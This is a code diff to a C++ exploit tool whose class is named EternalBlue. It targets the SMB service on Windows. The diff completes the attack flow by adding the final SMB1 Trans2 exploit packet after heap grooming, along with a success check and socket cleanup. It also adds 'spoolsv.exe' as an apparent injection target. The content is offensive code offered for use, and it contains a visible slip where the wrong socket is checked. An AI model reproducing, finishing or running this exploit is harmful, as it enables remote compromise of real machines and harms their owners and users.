@@ -306,6 +306,8 @@ private:
         TRANS2_EXPLOIT
     };
 
+    const std::string processName = "spoolsv.exe";
+
     int groomAllocations = 12;
     int groomDelta = 5;
     int maxExploitAttempts = 1;
@@ -322,14 +324,18 @@ public:
         InitializePackets();
     }
 
+     ~EternalBlue() {
+        Cleanup();
+    }
+
     bool Exploit(const std::string& host) {
         targetIP = host;
         std::cout << "[*] Target: " << host << "\n\n";
 
         for (int attempt = 0; attempt < maxExploitAttempts; ++attempt) {
             int grooms = groomAllocations + groomDelta * attempt;
-            auto payload_hdr = MakeSMB2PayloadHeadersPacket();
-
+            auto payload_hdr_pkt = MakeSMB2PayloadHeadersPacket();
+            
             SOCKET sock = Connect();
             if (sock == INVALID_SOCKET) continue;
             
@@ -342,24 +348,63 @@ public:
             SOCKET fhs_sock = Smb1FreeHole(true);
             if (fhs_sock == INVALID_SOCKET) { closesocket(sock); continue; }
 
-            if (!SMB2Grooming(grooms, payload_hdr)) { 
+            if (!SMB2Grooming(grooms, payload_hdr_pkt)) { 
                 closesocket(fhs_sock); closesocket(sock); continue; 
             }
 
             closesocket(fhs_sock);
 
-            if (!SMB2Grooming(6, payload_hdr)) { closesocket(sock); continue; }
+            if (!SMB2Grooming(6, payload_hdr_pkt)) { closesocket(sock); continue; }
 
             SOCKET fhf_sock = Smb1FreeHole(false);
             if (fhs_sock == INVALID_SOCKET) { closesocket(sock); continue; }
 
             closesocket(fhf_sock);
+
+            auto final_exploit = MakeSMB1Trans2ExploitPacket(ExploitType::TRANS2_EXPLOIT, 15);
+            if (!Send(sock, final_exploit.data(), final_exploit.size())) {
+                closesocket(sock);
+                continue;
+            }
+
+            unsigned char resp[1024];
+            int len = Recv(sock, resp, sizeof(resp));
+            if (len > 0) {
+                uint32_t status = *(uint32_t*)(resp + 9);
+                if (status == 0xC000000D) {
+                    std::cout << "[+] Exploit successful!\n";
+                }
+            }
         }
 
         return true;
     }
 
 private:
+
+    void Cleanup() {
+        for (auto sock : groomSockets) {
+            if (sock != INVALID_SOCKET) closesocket(sock);
+        }
+        groomSockets.clear();
+    }
+
+    bool Send(SOCKET sock, const unsigned char* data, size_t size) {
+        int sent = send(sock, (char*)data, size, 0);
+        if (sent != (int)size) {
+            std::cout << "[-] Send failed: " << sent << "/" << size << "\n";
+            return false;
+        }
+        return true;
+    }
+
+    int Recv(SOCKET sock, unsigned char* buffer, size_t size) {
+        int received = recv(sock, (char*)buffer, size, 0);
+        if (received <= 0) {
+            std::cout << "[-] Recv failed: " << WSAGetLastError() << "\n";
+        }
+        return received;
+    }
 
     SOCKET Connect() {
         SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -380,23 +425,6 @@ private:
         }
 
         return sock;
-    }
-
-    bool Send(SOCKET sock, const unsigned char* data, size_t size) {
-        int sent = send(sock, (char*)data, size, 0);
-        if (sent != (int)size) {
-            std::cout << "[-] Send failed: " << sent << "/" << size << "\n";
-            return false;
-        }
-        return true;
-    }
-
-    int Recv(SOCKET sock, unsigned char* buffer, size_t size) {
-        int received = recv(sock, (char*)buffer, size, 0);
-        if (received <= 0) {
-            std::cout << "[-] Recv failed: " << WSAGetLastError() << "\n";
-        }
-        return received;
     }
 
     void InitializePackets() {
@@ -828,6 +856,7 @@ private:
         
         return !groomSockets.empty();
     }
+
 };
 
 class Attack {
